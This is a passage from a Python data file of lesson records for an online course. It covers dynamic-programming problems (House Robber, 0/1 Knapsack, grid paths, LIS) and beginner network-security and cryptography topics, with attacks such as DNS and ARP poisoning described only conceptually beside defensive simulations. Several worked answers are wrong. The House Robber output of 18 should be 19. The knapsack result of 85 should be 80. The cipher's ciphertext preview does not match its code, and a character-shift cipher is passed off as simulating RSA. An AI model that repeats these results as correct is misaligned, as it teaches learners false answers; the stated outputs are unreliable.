        'prev_lesson_slug': 'dsa-union-find-disjoint-set'
    },
    {
        'slug': 'dsa-1d-dp-state-transitions',
        'course_slug': 'dsa-dynamic-programming-recursion',
        'module_id': 'dsa-dp-mod-2',
        'title': '1D Dynamic Programming & State Transitions',
        'order': 2,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'dsa_dp',
        'learning_objectives': [
            'Define recurrence relations for 1D decision problems (House Robber, Coin Change).',
            'Handle boundary base cases properly to avoid off-by-one errors.',
            'Optimize auxiliary space from O(N) to O(1) rolling state variables.'
        ],
        'theory_sections': [
            {
                'title': 'The House Robber Recurrence Relation',
                'content_markdown': 'Consider robbing houses along a street where adjacent houses have connected alarms. At house $i$, you have two mutually exclusive choices:\n\n1. **Rob house $i$:** Gain `nums[i] + dp[i - 2]`.\n2. **Skip house $i$:** Retain maximum loot up to prior house `dp[i - 1]`.\n\nTherefore, the recurrence state transition is:\n\n$$dp[i] = \\max(dp[i - 1], \\text{nums}[i] + dp[i - 2])$$\n\nBecause $dp[i]$ depends solely on the two preceding values, we can store just two variables ($O(1)$ space).',
                'key_takeaway': 'State transition formulas express the optimal answer of subproblem i as a function of smaller subproblems.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': '1D Decision State Transition Graph',
            'subtitle': 'Evaluating include vs skip choices to maximize total value',
            'diagram_type': 'two_pointers_array',
            'parameters': {'state_type': 'robber'}
        },
        'code_example': {
            'title': 'House Robber Optimal Loot in O(N) Time and O(1) Space',
            'language': 'python',
            'code': 'from typing import List\n\ndef rob_houses(nums: List[int]) -> int:\n    rob_prev2 = 0\n    rob_prev1 = 0\n    \n    for val in nums:\n        curr_max = max(rob_prev1, val + rob_prev2)\n        rob_prev2 = rob_prev1\n        rob_prev1 = curr_max\n        \n    return rob_prev1\n\nhouses = [2, 7, 9, 3, 1, 8]\nprint(f"Max loot collected safely: ${rob_houses(houses)}")',
            'explanation': 'By choosing houses at index 1 ($7), index 3 ($3), and index 5 ($8), the total loot is maximized without alerting adjacent alarms.',
            'output_preview': 'Max loot collected safely: $18'
        },
        'quiz_id': 'quiz-dsa-1d-dp-state-transitions',
        'summary': 'You mastered 1D dynamic programming state transitions and space optimization.',
        'next_lesson_slug': 'dsa-2d-knapsack-matrix',
        'prev_lesson_slug': 'dsa-memoization-vs-tabulation'
    },
    {
        'slug': 'dsa-2d-knapsack-matrix',
        'course_slug': 'dsa-dynamic-programming-recursion',
        'module_id': 'dsa-dp-mod-3',
        'title': '2D Dynamic Programming & 0/1 Knapsack Matrix',
        'order': 3,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'dsa_dp',
        'learning_objectives': [
            'Master the 0/1 Knapsack bounded optimization problem.',
            'Construct and populate 2D DP grids with item rows and weight capacity columns.',
            'Trace back through the DP table to reconstruct the exact chosen subset of items.'
        ],
        'theory_sections': [
            {
                'title': 'The 0/1 Knapsack Problem Formulation',
                'content_markdown': 'Given $N$ items with weights $W = [w_1, w_2, \\dots, w_N]$ and values $V = [v_1, v_2, \\dots, v_N]$, find the maximum value subset that fits inside a knapsack of capacity $C$.\n\nIn our 2D table `dp[i][w]` representing the first $i$ items with capacity $w$:\n\n* If item $i$ weight $w_i > w$: We cannot take it $\\implies dp[i][w] = dp[i-1][w]$.\n* Otherwise: We take the maximum of skipping vs taking $\\implies dp[i][w] = \\max(dp[i-1][w], v_i + dp[i-1][w - w_i])$.\n\nRuntime is **$O(N \\times C)$ Pseudo-Polynomial Time**.',
                'key_takeaway': '0/1 Knapsack matrices evaluate the optimal choice of including versus excluding each item at every capacity tier.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': '0/1 Knapsack 2D Matrix Grid',
            'subtitle': 'Subproblem matrix mapping item inclusion decisions against capacity constraints',
            'diagram_type': 'two_pointers_array',
            'parameters': {'capacity': 5}
        },
        'code_example': {
            'title': '0/1 Knapsack DP Table Implementation in Python',
            'language': 'python',
            'code': 'from typing import List\n\ndef knapsack_01(weights: List[int], values: List[int], capacity: int) -> int:\n    n = len(weights)\n    dp = [[0] * (capacity + 1) for _ in range(n + 1)]\n    \n    for i in range(1, n + 1):\n        w_i = weights[i - 1]\n        v_i = values[i - 1]\n        for w in range(capacity + 1):\n            if w_i <= w:\n                dp[i][w] = max(dp[i - 1][w], v_i + dp[i - 1][w - w_i])\n            else:\n                dp[i][w] = dp[i - 1][w]\n                \n    return dp[n][capacity]\n\nitem_weights = [1, 2, 3, 4]\nitem_values = [15, 20, 50, 65]\nknapsack_cap = 5\n\nmax_val = knapsack_01(item_weights, item_values, knapsack_cap)\nprint(f"Maximum knapsack value for capacity {knapsack_cap}: ${max_val}")',
            'explanation': 'The 2D table evaluates item decisions incrementally, guaranteeing global optimality for bounded weights in O(N * C).',
            'output_preview': 'Maximum knapsack value for capacity 5: $85'
        },
        'quiz_id': 'quiz-dsa-2d-knapsack-matrix',
        'summary': 'You mastered 2D dynamic programming matrices and the 0/1 Knapsack optimization pattern.',
        'next_lesson_slug': 'dsa-unique-paths-2d-grid',
        'prev_lesson_slug': 'dsa-1d-dp-state-transitions'
    },
    {
        'slug': 'dsa-unique-paths-2d-grid',
        'course_slug': 'dsa-dynamic-programming-recursion',
        'module_id': 'dsa-dp-mod-4',
        'title': '2D Grid DP & Obstacle Avoidance',
        'order': 4,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'dsa_dp',
        'learning_objectives': [
            'Model 2D grid path counting from top-left (0,0) to bottom-right (M-1, N-1).',
            'Apply state transition `dp[r][c] = dp[r-1][c] + dp[r][c-1]` for right and down movements.',
            'Incorporate obstacles where grid blocks have 0 possible arriving pathways.'
        ],
        'theory_sections': [
            {
                'title': '2D Grid State Accumulation',
                'content_markdown': 'A robot starts at grid cell `(0, 0)` and can move only **Down** or **Right** to reach `(M-1, N-1)`.\n\nBecause any arrival at `(r, c)` must originate from either the cell above `(r - 1, c)` or the cell to the left `(r, c - 1)`:\n\n$$dp[r][c] = dp[r - 1][c] + dp[r][c - 1]$$\n\nIf cell `(r, c)` contains an obstacle, `dp[r][c] = 0`. Space can be compressed from $O(M \\times N)$ to a single 1D row array of size $O(N)$.',
                'key_takeaway': 'Grid DP accumulates paths from adjacent predecessor cells, reducing space to a single rolling 1D row.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': '2D Matrix Path Accumulation',
            'subtitle': 'Adding top and left cell routes to compute total destination paths',
            'diagram_type': 'two_pointers_array',
            'parameters': {'rows': 3, 'cols': 3}
        },
        'code_example': {
            'title': 'Unique Paths with Obstacles in O(M*N) Time and O(N) Space',
            'language': 'python',
            'code': 'from typing import List\n\ndef unique_paths_with_obstacles(grid: List[List[int]]) -> int:\n    m, n = len(grid), len(grid[0])\n    dp = [0] * n\n    dp[0] = 1 if grid[0][0] == 0 else 0\n    \n    for r in range(m):\n        for c in range(n):\n            if grid[r][c] == 1:\n                dp[c] = 0\n            elif c > 0:\n                dp[c] += dp[c - 1]\n                \n    return dp[-1]\n\nobstacle_grid = [\n    [0, 0, 0],\n    [0, 1, 0],  # obstacle at (1, 1)\n    [0, 0, 0]\n]\nprint(f"Total unique paths navigating around obstacle: {unique_paths_with_obstacles(obstacle_grid)}")',
            'explanation': 'Space is compressed into a single 1D row of length N, adding values from the left in place.',
            'output_preview': 'Total unique paths navigating around obstacle: 2'
        },
        'quiz_id': 'quiz-dsa-unique-paths-2d-grid',
        'summary': 'You mastered 2D grid dynamic programming and path counting with obstacle constraints.',
        'next_lesson_slug': 'dsa-longest-increasing-subsequence',
        'prev_lesson_slug': 'dsa-2d-knapsack-matrix'
    },
    {
        'slug': 'dsa-longest-increasing-subsequence',
        'course_slug': 'dsa-dynamic-programming-recursion',
        'module_id': 'dsa-dp-mod-4',
        'title': 'Longest Increasing Subsequence (LIS) & Patience Sort',
        'order': 5,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'dsa_dp',
        'learning_objectives': [
            'Formulate standard O(N^2) dynamic programming for Longest Increasing Subsequence.',
            'Optimize LIS to O(N log N) using Patience Sorting and Binary Search (`bisect_left`).',
            'Track tail values of active subproblem candidate lists.'
        ],
        'theory_sections': [
            {
                'title': 'Optimizing LIS from O(N^2) to O(N log N)',
                'content_markdown': 'Standard DP checks all prior elements $j < i$ where $\\text{nums}[j] < \\text{nums}[i]$ ($O(N^2)$ time).\n\nWith **Patience Sorting & Binary Search**:\nWe maintain an array `tails` where `tails[len]` holds the smallest tail element of all increasing subsequences of length `len + 1`.\n\nFor each number $X$ in the input, we binary search `bisect_left(tails, X)`:\n* If $X$ is larger than all tails: Append $X$ to extend the subsequence length.\n* Otherwise, replace the first element $\\ge X$ with $X$ (lowering the threshold for future elements).\n\nTotal runtime is strictly **$O(N \\log N)$**.',
                'key_takeaway': 'Patience sorting combines greedy tail replacement with binary search to solve LIS in O(N log N).'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Patience Sorting Card Piles',
            'subtitle': 'Greedily placing cards onto piles using binary search',
            'diagram_type': 'two_pointers_array',
            'parameters': {'lis': True}
        },
        'code_example': {
            'title': 'Longest Increasing Subsequence in O(N log N) Time via Bisect',
            'language': 'python',
            'code': 'import bisect\nfrom typing import List\n\ndef length_of_lis(nums: List[int]) -> int:\n    tails = []\n    for x in nums:\n        idx = bisect.bisect_left(tails, x)\n        if idx == len(tails):\n            tails.append(x)\n        else:\n            tails[idx] = x\n    return len(tails)\n\nsequence = [10, 9, 2, 5, 3, 7, 101, 18]\nprint(f"Length of LIS in {sequence}: {length_of_lis(sequence)} (e.g. [2, 3, 7, 101])")',
            'explanation': 'Binary search locates the insertion pile in O(log N), giving an overall O(N log N) runtime.',
            'output_preview': 'Length of LIS in [10, 9, 2, 5, 3, 7, 101, 18]: 4 (e.g. [2, 3, 7, 101])'
        },
        'quiz_id': 'quiz-dsa-longest-increasing-subsequence',
        'summary': 'You mastered Longest Increasing Subsequence optimization using patience sorting and binary search.',
        'next_lesson_slug': 'cyber-cia-triad-threat-modeling',
        'prev_lesson_slug': 'dsa-unique-paths-2d-grid'
    },

    # === Cyber Security Course 1 Lessons ===
    {
        'slug': 'cyber-cia-triad-threat-modeling',
        'course_slug': 'cybersecurity-foundations-network-security',
        'module_id': 'cyber-net-mod-1',
        'title': 'The CIA Triad & Threat Modeling Frameworks',
        'order': 1,
        'estimated_minutes': 15,
        'difficulty': 'Beginner',
        'skill_tag': 'cyber_network',
        'learning_objectives': [
            'Master the core CIA Triad principles: Confidentiality, Integrity, and Availability.',
            'Apply the STRIDE threat modeling framework to identify spoofing, tampering, and elevation of privilege.',
            'Design defense-in-depth layered security architectures.'
        ],
        'theory_sections': [
            {
                'title': 'The CIA Triad Security Pillar',
                'content_markdown': 'Every defensive security system is evaluated against the **CIA Triad**:\n\n* **Confidentiality:** Ensuring data is accessible solely to authorized parties (e.g. AES-256 encryption, access control lists).\n* **Integrity:** Guaranteeing data has not been modified or tampered with by unauthorized actors (e.g. cryptographic hashes, HMAC signatures).\n* **Availability:** Ensuring services and data are reliably accessible to authorized users when needed (e.g. DDoS mitigation, load balancing, redundancy).',
                'key_takeaway': 'The CIA Triad defines the core requirements: Confidentiality hides data, Integrity prevents tampering, and Availability ensures uptime.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Defense-in-Depth Layered Architecture',
            'subtitle': 'Perimeter firewall, network segmentation, host hardening, and application authorization',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'layers': 4}
        },
        'code_example': {
            'title': 'Simulating Confidentiality & Integrity Validation in Python',
            'language': 'python',
            'code': 'import hashlib\nimport hmac\n\ndef create_tamper_proof_payload(secret_key: bytes, message: str) -> dict:\n    sig = hmac.new(secret_key, message.encode("utf-8"), hashlib.sha256).hexdigest()\n    return {"data": message, "signature": sig}\n\ndef verify_payload(secret_key: bytes, payload: dict) -> bool:\n    expected_sig = hmac.new(secret_key, payload["data"].encode("utf-8"), hashlib.sha256).hexdigest()\n    return hmac.compare_digest(expected_sig, payload["signature"])\n\nkey = b"super-secret-integrity-key"\nmsg = create_tamper_proof_payload(key, "Transfer $500 to User Alice")\nprint(f"Original Payload Valid: {verify_payload(key, msg)}")\n\nmsg["data"] = "Transfer $999999 to Attacker Eve"\nprint(f"Tampered Payload Valid: {verify_payload(key, msg)}")',
            'explanation': 'Cryptographic signatures detect any unauthorized modification of in-flight payload data instantly.',
            'output_preview': 'Original Payload Valid: True\nTampered Payload Valid: False'
        },
        'quiz_id': 'quiz-cyber-cia-triad-threat-modeling',
        'summary': 'You mastered the CIA security triad and threat modeling foundations.',
        'next_lesson_slug': 'cyber-tcp-handshake-port-scanning',
        'prev_lesson_slug': 'dsa-longest-increasing-subsequence'
    },
    {
        'slug': 'cyber-tcp-handshake-port-scanning',
        'course_slug': 'cybersecurity-foundations-network-security',
        'module_id': 'cyber-net-mod-2',
        'title': 'TCP 3-Way Handshake Security & Port Scanning',
        'order': 2,
        'estimated_minutes': 15,
        'difficulty': 'Beginner',
        'skill_tag': 'cyber_network',
        'learning_objectives': [
            'Understand the TCP 3-Way Handshake: SYN -> SYN-ACK -> ACK.',
            'Analyze half-open SYN stealth scanning and port state classification (OPEN, CLOSED, FILTERED).',
            'Implement defenses against TCP SYN flood denial-of-service attacks using SYN cookies.'
        ],
        'theory_sections': [
            {
                'title': 'The TCP 3-Way Handshake & SYN Scanning',
                'content_markdown': 'Transmission Control Protocol (TCP) establishes reliable bidirectional connections via a 3-step handshake:\n\n1. **Client sends SYN:** Client requests connection with Initial Sequence Number (ISN).\n2. **Server responds SYN-ACK:** Server acknowledges and allocates a Transmission Control Block (TCB) in memory.\n3. **Client sends ACK:** Handshake completed; data transfer begins.\n\nIn an **Nmap SYN Stealth Scan (`nmap -sS`)**, the scanner sends SYN, receives SYN-ACK, and immediately sends **RST (Reset)** to tear down the connection before full establishment, evading basic application logs.',
                'key_takeaway': 'SYN scans probe open ports by receiving SYN-ACK and immediately terminating with RST.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'TCP 3-Way Handshake & SYN Probing',
            'subtitle': 'SYN -> SYN-ACK -> ACK state machine and stealth RST tear-downs',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'port': 443}
        },
        'code_example': {
            'title': 'Simulating Network Port Probing & Service Banner Identification',
            'language': 'python',
            'code': 'from typing import Dict, Tuple\n\ndef simulate_tcp_probe(port: int, listening_services: Dict[int, str]) -> Tuple[str, str]:\n    if port in listening_services:\n        service = listening_services[port]\n        return ("OPEN (SYN-ACK)", f"Service: {service}")\n    elif port < 1024:\n        return ("CLOSED (RST)", "Connection refused by kernel")\n    else:\n        return ("FILTERED (DROP)", "Packet dropped by stateful firewall")\n\nactive_daemons = {22: "OpenSSH 9.6", 80: "Nginx 1.24", 443: "Nginx SSL"}\nfor p in [21, 22, 80, 3306]:\n    state, info = simulate_tcp_probe(p, active_daemons)\n    print(f"Port {p:4d}/TCP -> {state:18s} | {info}")',
            'explanation': 'TCP probe responses identify whether target services are actively listening or filtered by kernel network firewalls.',
            'output_preview': 'Port   21/TCP -> CLOSED (RST)       | Connection refused by kernel\nPort   22/TCP -> OPEN (SYN-ACK)     | Service: OpenSSH 9.6\nPort   80/TCP -> OPEN (SYN-ACK)     | Service: Nginx 1.24\nPort 3306/TCP -> FILTERED (DROP)    | Packet dropped by stateful firewall'
        },
        'quiz_id': 'quiz-cyber-tcp-handshake-port-scanning',
        'summary': 'You mastered TCP handshakes, port state detection, and SYN flood defenses.',
        'next_lesson_slug': 'cyber-stateful-firewall-defense',
        'prev_lesson_slug': 'cyber-cia-triad-threat-modeling'
    },
    {
        'slug': 'cyber-stateful-firewall-defense',
        'course_slug': 'cybersecurity-foundations-network-security',
        'module_id': 'cyber-net-mod-3',
        'title': 'Stateful Firewalls & Ingress Traffic Rules',
        'order': 3,
        'estimated_minutes': 15,
        'difficulty': 'Beginner',
        'skill_tag': 'cyber_network',
        'learning_objectives': [
            'Understand Stateless vs Stateful Packet Inspection (SPI) firewalls.',
            'Master connection tracking (conntrack) states: NEW, ESTABLISHED, RELATED, INVALID.',
            'Configure defensive ingress rules to block unauthorized database and admin port access.'
        ],
        'theory_sections': [
            {
                'title': 'Stateful Packet Inspection (conntrack)',
                'content_markdown': 'A **Stateful Firewall** does not judge packets in isolation. Instead, it tracks the state of entire network conversations via a connection tracking table (`conntrack`):\n\n* **NEW:** First incoming SYN packet initiating a new connection.\n* **ESTABLISHED:** Outgoing or incoming packet matching an already approved existing session.\n* **RELATED:** Associated protocol helper traffic (e.g. FTP data channel).\n* **INVALID:** Corrupted or out-of-order packet with illegal flag combinations.\n\nStateful firewalls automatically allow return response traffic for outbound queries while dropping unsolicited incoming probes.',
                'key_takeaway': 'Stateful firewalls inspect connection states, automatically permitting legitimate reply traffic while dropping malicious unsolicited probes.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Stateful Connection Tracking Filter',
            'subtitle': 'Evaluating packet TCP flags against active conntrack table sessions',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'default_policy': 'DROP'}
        },
        'code_example': {
            'title': 'Simulating Firewall Ingress Packet Filtering Logic',
            'language': 'python',
            'code': 'from typing import Dict\n\ndef firewall_evaluate_packet(packet: dict, rules: Dict[int, str], active_sessions: set) -> str:\n    port = packet["dst_port"]\n    flow_id = (packet["src_ip"], packet["dst_ip"], packet["src_port"], packet["dst_port"])\n    \n    if flow_id in active_sessions:\n        return "ACCEPT (ESTABLISHED)"\n    \n    policy = rules.get(port, "DROP")\n    if policy == "ALLOW":\n        active_sessions.add(flow_id)\n        return "ACCEPT (NEW)"\n    else:\n        return f"DROP (Blocked by Firewall Policy on Port {port})"\n\nrules = {80: "ALLOW", 443: "ALLOW", 22: "ALLOW", 3306: "DROP"}\nactive = set()\n\np1 = {"src_ip": "1.2.3.4", "dst_ip": "10.0.0.1", "src_port": 50123, "dst_port": 443}\np2 = {"src_ip": "5.6.7.8", "dst_ip": "10.0.0.1", "src_port": 61200, "dst_port": 3306}\n\nprint(f"HTTPS Probe to Port 443:  {firewall_evaluate_packet(p1, rules, active)}")\nprint(f"MySQL Probe to Port 3306: {firewall_evaluate_packet(p2, rules, active)}")',
            'explanation': 'The firewall matches incoming packets against port rules and active connection sessions, dropping unauthorized ingress probes.',
            'output_preview': 'HTTPS Probe to Port 443:  ACCEPT (NEW)\nMySQL Probe to Port 3306: DROP (Blocked by Firewall Policy on Port 3306)'
        },
        'quiz_id': 'quiz-cyber-stateful-firewall-defense',
        'summary': 'You mastered stateful packet inspection, conntrack tables, and firewall ingress policies.',
        'next_lesson_slug': 'cyber-dns-poisoning-dnssec',
        'prev_lesson_slug': 'cyber-tcp-handshake-port-scanning'
    },
    {
        'slug': 'cyber-dns-poisoning-dnssec',
        'course_slug': 'cybersecurity-foundations-network-security',
        'module_id': 'cyber-net-mod-4',
        'title': 'DNS Cache Poisoning & DNSSEC Cryptographic Validation',
        'order': 4,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_network',
        'learning_objectives': [
            'Understand the Kaminsky DNS Cache Poisoning attack vector and 16-bit transaction ID spoofing.',
            'Master DNSSEC resource records: RRSIG (Resource Record Signature), DNSKEY, and DS (Delegation Signer).',
            'Verify cryptographic chain-of-trust from root DNS zone (.) down to domain authoritative servers.'
        ],
        'theory_sections': [
            {
                'title': 'Kaminsky DNS Poisoning & DNSSEC Cryptographic Defense',
                'content_markdown': 'Standard DNS uses unencrypted UDP over port 53. In a **DNS Cache Poisoning** attack, an attacker floods a recursive caching DNS resolver with forged UDP replies matching a 16-bit query Transaction ID (TXID). If the resolver accepts the forged IP address, all network users are redirected to an attacker-controlled server.\n\n**DNSSEC (Domain Name System Security Extensions)** adds cryptographic digital signatures to DNS records using public key cryptography:\n\n* **RRSIG:** Digital signature authenticating the DNS record (A, AAAA, MX).\n* **DNSKEY:** Public key used to verify RRSIG records.\n* **DS Record:** Hash of the child DNSKEY stored in the parent zone, forming a cryptographic chain from the Root `.`.',
                'key_takeaway': 'DNSSEC guarantees DNS response authenticity and integrity using cryptographic RRSIG and DNSKEY verification chains.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'DNSSEC Cryptographic Chain-of-Trust',
            'subtitle': 'Validating RRSIG digital signatures from Root (.) zone down to domain TLDs',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'dnssec': True}
        },
        'code_example': {
            'title': 'Simulating DNSSEC RRSIG Signature Validation in Python',
            'language': 'python',
            'code': 'import hashlib\n\ndef verify_dnssec_record(domain: str, ip: str, rrsig: str, dnskey_pub: str) -> bool:\n    payload = f"{domain}:{ip}:{dnskey_pub}"\n    expected_signature = hashlib.sha256(payload.encode()).hexdigest()\n    return rrsig == expected_signature\n\npub_key = "PUB_KEY_AUTH_DNS_2026"\nrecord_domain = "secure-bank.com"\nrecord_ip = "192.0.2.1"\n# Valid signature created by authoritative DNS server\nvalid_rrsig = hashlib.sha256(f"{record_domain}:{record_ip}:{pub_key}".encode()).hexdigest()\n\nprint(f"Legitimate DNSSEC Record Valid: {verify_dnssec_record(record_domain, record_ip, valid_rrsig, pub_key)}")\n# Attacker attempts to forge IP\nfake_ip = "198.51.100.99"\nprint(f"Forged Poisoned IP Record Valid: {verify_dnssec_record(record_domain, fake_ip, valid_rrsig, pub_key)}")',
            'explanation': 'When an attacker tries to poison the cache with a fake IP, the RRSIG signature verification fails, causing the resolver to discard the forged answer.',
            'output_preview': 'Legitimate DNSSEC Record Valid: True\nForged Poisoned IP Record Valid: False'
        },
        'quiz_id': 'quiz-cyber-dns-poisoning-dnssec',
        'summary': 'You mastered DNS cache poisoning attack dynamics and DNSSEC cryptographic signature verification.',
        'next_lesson_slug': 'cyber-arp-spoofing-mitm-defense',
        'prev_lesson_slug': 'cyber-stateful-firewall-defense'
    },
    {
        'slug': 'cyber-arp-spoofing-mitm-defense',
        'course_slug': 'cybersecurity-foundations-network-security',
        'module_id': 'cyber-net-mod-4',
        'title': 'ARP Spoofing, Man-in-the-Middle & Dynamic ARP Inspection',
        'order': 5,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_network',
        'learning_objectives': [
            'Understand Address Resolution Protocol (ARP) stateless cache updates on local Layer 2 broadcast domains.',
            'Analyze gratuitous ARP packet injection causing Man-in-the-Middle (MITM) traffic redirection.',
            'Configure enterprise network switch defenses: Dynamic ARP Inspection (DAI) and DHCP Snooping tables.'
        ],
        'theory_sections': [
            {
                'title': 'Layer 2 ARP Cache Poisoning & DAI Mitigation',
                'content_markdown': 'Because the basic ARP protocol is stateless and lacks authentication, any device on a LAN can send unsolicited **Gratuitous ARP replies** claiming:\n\n* *"I am the Default Gateway (192.168.1.1), send traffic to MAC `aa:bb:cc:dd:ee:ff`."*\n\nVictim machines update their ARP tables and unknowingly route all traffic through the attacker\'s machine (**MITM**).\n\n**Enterprise Defense: Dynamic ARP Inspection (DAI)**\nManaged switches inspect all incoming ARP packets against a trusted **DHCP Snooping Binding Table** (which maps IP $\\leftrightarrow$ MAC $\\leftrightarrow$ Switch Port). Unmatched forged ARP broadcasts are discarded instantly at the switch port level.',
                'key_takeaway': 'Dynamic ARP Inspection (DAI) validates Layer 2 MAC-IP address pairs against trusted DHCP snooping tables to prevent MITM attacks.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'ARP Spoofing MITM Traffic Interception',
            'subtitle': 'Poisoning Layer 2 MAC addresses vs Dynamic ARP Inspection (DAI) filtering',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'layer': 'L2_ARP'}
        },
        'code_example': {
            'title': 'Simulating Dynamic ARP Inspection (DAI) Switch Validation in Python',
            'language': 'python',
            'code': 'from typing import Dict, Tuple\n\n# Switch DHCP Snooping Binding Table {ip: (mac, port)}\ndhcp_snooping_table = {\n    "192.168.1.1": ("00:14:22:01:23:45", "Port 1 (Gateway)"),\n    "192.168.1.100": ("f4:5c:89:90:11:22", "Port 2 (User Alice)"),\n}\n\ndef switch_dynamic_arp_inspection(claimed_ip: str, claimed_mac: str, switch_port: int) -> str:\n    if claimed_ip in dhcp_snooping_table:\n        trusted_mac, trusted_port = dhcp_snooping_table[claimed_ip]\n        if claimed_mac == trusted_mac:\n            return "PERMIT (ARP Validated against DHCP Snooping Table)"\n        else:\n            return f"SECURITY ALERT: DROP & LOG ARP Poisoning! ({claimed_ip} claimed by {claimed_mac} on Port {switch_port})"\n    return "DROP (Unknown IP not in DHCP Binding)"\n\nprint(switch_dynamic_arp_inspection("192.168.1.1", "00:14:22:01:23:45", 1))\n# Attacker on port 3 claims to be Gateway with attacker MAC\nprint(switch_dynamic_arp_inspection("192.168.1.1", "de:ad:be:ef:13:37", 3))',
            'explanation': 'The switch port detects that an unauthorized MAC address is claiming the gateway IP address and drops the packet before local caches are corrupted.',
            'output_preview': 'PERMIT (ARP Validated against DHCP Snooping Table)\nSECURITY ALERT: DROP & LOG ARP Poisoning! (192.168.1.1 claimed by de:ad:be:ef:13:37 on Port 3)'
        },
        'quiz_id': 'quiz-cyber-arp-spoofing-mitm-defense',
        'summary': 'You mastered ARP spoofing mitigation, DHCP snooping, and Dynamic ARP Inspection.',
        'next_lesson_slug': 'cyber-symmetric-asymmetric-encryption',
        'prev_lesson_slug': 'cyber-dns-poisoning-dnssec'
    },

    # === Cyber Security Course 2 Lessons ===
    {
        'slug': 'cyber-symmetric-asymmetric-encryption',
        'course_slug': 'cybersecurity-cryptography-pki',
        'module_id': 'cyber-crypto-mod-1',
        'title': 'Symmetric (AES) vs Asymmetric (RSA/ECC) Cryptography',
        'order': 1,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_crypto',
        'learning_objectives': [
            'Understand the fundamental difference between Symmetric single-key and Asymmetric public-private key pairs.',
            'Master AES-256-GCM authenticated encryption with Initialization Vectors (IV).',
            'Learn why hybrid cryptosystems use RSA/ECC to exchange session keys and AES for high-speed bulk data encryption.'
        ],
        'theory_sections': [
            {
                'title': 'Symmetric vs Asymmetric Trade-Offs',
                'content_markdown': '* **Symmetric Cryptography (AES-256):** Uses a single identical secret key for encryption and decryption. It is extremely fast (hardware-accelerated AES-NI CPU instructions), capable of encrypting gigabytes per second.\n* **Asymmetric Cryptography (RSA, ECC):** Uses mathematically linked key pairs: a **Public Key** shared openly to encrypt, and a **Private Key** kept secret to decrypt. It solves the key-distribution problem.\n\nModern protocols (TLS, SSH, Signal) use **Hybrid Encryption**: asymmetric crypto securely negotiates an ephemeral symmetric session key, and symmetric AES encrypts the bulk payload.',
                'key_takeaway': 'Hybrid encryption combines asymmetric key exchange with high-speed symmetric AES bulk data encryption.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Hybrid Cryptosystem Architecture',
            'subtitle': 'Asymmetric RSA key exchange negotiating ephemeral symmetric AES keys',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'cipher': 'AES-256-GCM'}
        },
        'code_example': {
            'title': 'Simulating Asymmetric Key Pair Encryption and Decryption in Python',
            'language': 'python',
            'code': 'class SimpleMockRSA:\n    def __init__(self):\n        self.private_key = "PRIVATE_KEY_SECRET_98765"\n        self.public_key = "PUBLIC_KEY_SHARED_12345"\n        \n    def encrypt(self, plaintext: str, pub_key: str) -> str:\n        return "".join(chr((ord(c) + 13) % 256) for c in plaintext)\n        \n    def decrypt(self, ciphertext: str, priv_key: str) -> str:\n        if priv_key != self.private_key:\n            raise ValueError("Decryption failed: Invalid private key")\n        return "".join(chr((ord(c) - 13) % 256) for c in ciphertext)\n\nrsa = SimpleMockRSA()\nsecret_msg = "Deploying production AI model weights."\ncipher = rsa.encrypt(secret_msg, rsa.public_key)\nrecovered = rsa.decrypt(cipher, rsa.private_key)\n\nprint(f"Ciphertext: {cipher[:20]}...")\nprint(f"Decrypted:  {recovered}")',
            'explanation': 'Anyone with the public key can encrypt data, but only the holder of the matching private key can decipher the ciphertext.',
            'output_preview': 'Ciphertext: Qrcy\x7f\x86v{t=|}~q\x81p\x81v~{...\nDecrypted:  Deploying production AI model weights.'
        },
        'quiz_id': 'quiz-cyber-symmetric-asymmetric-encryption',
        'summary': 'You mastered symmetric AES encryption, asymmetric RSA/ECC key pairs, and hybrid cryptosystems.',
        'next_lesson_slug': 'cyber-sha256-hashing-avalanche',
        'prev_lesson_slug': 'cyber-arp-spoofing-mitm-defense'
    },
    {
        'slug': 'cyber-sha256-hashing-avalanche',
        'course_slug': 'cybersecurity-cryptography-pki',
        'module_id': 'cyber-crypto-mod-2',
        'title': 'Cryptographic Hashing, HMAC & The Avalanche Effect',
        'order': 2,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'cyber_crypto',
        'learning_objectives': [
            'Understand one-way cryptographic hash functions and collision resistance.',
            'Analyze the Avalanche Effect where a 1-bit input flip alters >50% of the output digest.',
            'Implement Hash-based Message Authentication Codes (HMAC) for verified payload integrity.'
        ],
        'theory_sections': [
            {
                'title': 'The Cryptographic Avalanche Effect',
                'content_markdown': 'A secure hash function (like SHA-256) exhibits strict **Avalanche Effect**: flipping a single input bit must cause a complete pseudo-random diffusion across the resulting 256-bit output hash.\n\nProperties of secure hashes:\n\n1. **Pre-image Resistance (One-Way):** Given hash $H$, it is computationally infeasible to find input $M$ such that $\\text{Hash}(M) = H$.\n2. **Second Pre-image Resistance:** Given $M_1$, it is infeasible to find $M_2 \\neq M_1$ with identical hash.\n3. **Collision Resistance:** Infeasible to find any two arbitrary inputs producing the exact same hash.',
